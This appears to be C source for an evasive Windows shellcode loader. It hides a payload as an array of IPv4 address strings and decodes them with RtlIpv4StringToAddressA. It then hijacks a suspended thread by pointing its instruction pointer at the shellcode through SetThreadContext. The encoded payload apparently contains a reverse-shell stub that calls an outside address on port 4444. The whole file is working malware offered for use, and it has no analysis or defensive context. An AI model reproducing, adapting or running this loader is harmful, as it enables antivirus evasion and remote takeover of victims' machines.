#include <Windows.h>
#include <stdio.h>
#include <Ip2string.h>
#pragma comment(lib, "Ntdll.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

const char* IPv4Shell[] = {
    "252.72.131.228", "240.232.192.0", "0.0.65.81", "65.80.82.81", "86.72.49.210", "101.72.139.82", "96.72.139.82", "24.72.139.82", "32.72.139.114", "80.72.15.183", "74.74.77.49", "201.72.49.192",
    "172.60.97.124", "2.44.32.65", "193.201.13.65", "1.193.226.237", "82.65.81.72", "139.82.32.139", "66.60.72.1", "208.139.128.136", "0.0.0.72", "133.192.116.103", "72.1.208.80", "139.72.24.68",
    "139.64.32.73", "1.208.227.86", "72.255.201.65", "139.52.136.72", "1.214.77.49", "201.72.49.192", "172.65.193.201", "13.65.1.193", "56.224.117.241", "76.3.76.36", "8.69.57.209", "117.216.88.68",
    "139.64.36.73", "1.208.102.65", "139.12.72.68", "139.64.28.73", "1.208.65.139", "4.136.72.1", "208.65.88.65", "88.94.89.90", "65.88.65.89", "65.90.72.131", "236.32.65.82", "255.224.88.65",
    "89.90.72.139", "18.233.87.255", "255.255.93.73", "190.119.115.50", "95.51.50.0", "0.65.86.73", "137.230.72.129", "236.160.1.0", "0.73.137.229", "73.188.2.0", "17.92.192.168", "11.101.65.84",
    "73.137.228.76", "137.241.65.186", "76.119.38.7", "255.213.76.137", "234.104.1.1", "0.0.89.65", "186.41.128.107", "0.255.213.80", "80.77.49.201", "77.49.192.72", "255.192.72.137", "194.72.255.192",
    "72.137.193.65", "186.234.15.223", "224.255.213.72", "137.199.106.16", "65.88.76.137", "226.72.137.249", "65.186.153.165", "116.97.255.213", "72.129.196.64", "2.0.0.73", "184.99.109.100", "0.0.0.0",
    "0.65.80.65", "80.72.137.226", "87.87.87.77", "49.192.106.13", "89.65.80.226", "252.102.199.68", "36.84.1.1", "72.141.68.36", "24.198.0.104", "72.137.230.86", "80.65.80.65", "80.65.80.73",
    "255.192.65.80", "73.255.200.77", "137.193.76.137", "193.65.186.121", "204.63.134.255", "213.72.49.210", "72.255.202.139", "14.65.186.8", "135.29.96.255", "213.187.240.181", "162.86.65.186", "166.149.189.157",
    "255.213.72.131", "196.40.60.6", "124.10.128.251", "224.117.5.187", "71.19.114.111", "106.0.89.65", "137.218.255.213"
};
#define ElementsNumber 115
#define SizeOfShellcode 460

BOOL DecodeIPv4Fuscation(const char* IPV4[], PVOID LpBaseAddress) {
    PCSTR Terminator = NULL;
    PVOID LpBaseAddress2 = NULL;
    NTSTATUS STATUS;
    int i = 0;
    for (int j = 0; j < ElementsNumber; j++) {
        LpBaseAddress2 = PVOID((ULONG_PTR)LpBaseAddress + i);
        STATUS = RtlIpv4StringToAddressA((PCSTR)IPV4[j], FALSE, &Terminator, (in_addr*)LpBaseAddress2);
        if (!NT_SUCCESS(STATUS)) {
            printf("[!] RtlIpv6StringToAddressA failed for %s result %x", IPV4[j], STATUS);
            return FALSE;
        }
        else {
            i = i + 4;
        }
    }
    return TRUE;
}


BOOL Hijacking(HANDLE hThread, PBYTE pPayload, SIZE_T sPayloadSize) {

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;

   
    PVOID execMem = VirtualAlloc(
        NULL,
        sPayloadSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!execMem) {
        printf("[!] VirtualAlloc failed: %d\n", GetLastError());
        return FALSE;
    }

    memcpy(execMem, pPayload, sPayloadSize);

    DWORD oldProtect;
    if (!VirtualProtect(execMem, sPayloadSize, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("[!] VirtualProtect failed: %d\n", GetLastError());
        return FALSE;
    }

   
    if (!GetThreadContext(hThread, &ctx)) {
        printf("[!] GetThreadContext failed: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Original RIP: 0x%llx\n", ctx.Rip);

    
    ctx.Rsp -= 0x200;

   
    ctx.Rip = (DWORD64)execMem;

    
    if (!SetThreadContext(hThread, &ctx)) {
        printf("[!] SetThreadContext failed: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] RIP hijacked to shellcode\n");

    return TRUE;
}

DWORD WINAPI DummyFunction(LPVOID lpParam) {
    Sleep(10000);
    return 0;
}


int main() {

    HANDLE hThread = NULL;

    PBYTE payload = (PBYTE)VirtualAlloc(
        NULL,
        SizeOfShellcode,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!payload) {
        printf("[!] Payload alloc failed\n");
        return -1;
    }

    if (!DecodeIPv4Fuscation(IPv4Shell, payload)) {
        return -1;
    }

    hThread = CreateThread(
        NULL,
        0,
        DummyFunction,
        NULL,
        CREATE_SUSPENDED,
        NULL
    );

    if (!hThread) {
        printf("[!] CreateThread failed: %d\n", GetLastError());
        return -1;
    }

    printf("[+] Thread created (suspended)\n");

    if (!Hijacking(hThread, payload, SizeOfShellcode)) {
        return -1;
    }

    printf("[+] Resuming thread...\n");

    ResumeThread(hThread);

    WaitForSingleObject(hThread, INFINITE);

    return 0;
}
